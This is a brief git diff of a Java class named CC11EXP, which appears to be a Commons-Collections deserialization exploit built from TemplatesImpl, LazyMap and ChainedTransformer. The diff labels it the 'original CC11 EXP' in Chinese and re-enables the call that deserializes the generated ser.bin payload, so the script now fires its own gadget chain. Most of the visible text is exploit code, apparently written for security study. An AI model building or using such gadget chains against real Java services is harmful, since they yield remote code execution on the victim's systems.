@@ -13,6 +13,7 @@ import java.nio.file.Paths;
 import java.util.HashMap;
 import java.util.Map;
 
+// 原始的 CC11 EXP
 public class CC11EXP {
     public static void main(String[] args) throws Exception{
         com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
@@ -50,7 +51,7 @@ public class CC11EXP {
         factoryField.set(lazyMap, chainedTransformer);
 
         serialize(expMap);
-       // unserialize("ser.bin");
+        unserialize("ser.bin");
     }
     public static void serialize(Object obj) throws IOException {
         ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
